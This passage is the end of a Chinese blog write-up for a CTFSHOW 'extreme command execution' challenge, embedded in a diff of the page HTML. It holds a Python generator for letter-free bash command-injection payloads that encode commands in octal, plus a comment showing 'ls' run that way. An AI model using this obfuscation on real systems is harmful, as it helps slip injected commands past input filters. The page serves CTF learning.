class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者也可以先用记录各个数字字符  然后拼凑， 如</span></span><br><span class="line"><span class="comment"># ___=$((~$(($((~$(())))$((~$(())))))))&amp;&amp;____=$((~$(($((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_____=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;______=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_______=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;__________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;___________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"><span class="comment"># 相当于___=1,____=2,...</span></span><br><span class="line"><span class="comment"># &amp;&amp;$0&lt;&lt;&lt;$\&#x27;\\$___$_______$______\\$___$________$_____\&#x27;	# 执行了ls $&#x27;\154\163&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/09/28/CTFSHOW-extremeRCE-wp/" class="leancloud-visitors view" data-flag-title="CTFSHOW 极限命令执行 wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/09/28/SWPUCTF2021-hardrce3-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/09/24/rce-noalpha/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-09-28 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>41</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>73</span></a></li> <li><a href="/tags/web/">web<span>45</span></a></li> <li><a href="/tags/php/">php<span>18</span></a></li> <li><a href="/tags/rce/">rce<span>13</span></a></li> <li><a href="/tags/bypass/">bypass<span>5</span></a></li> <li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li> <li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
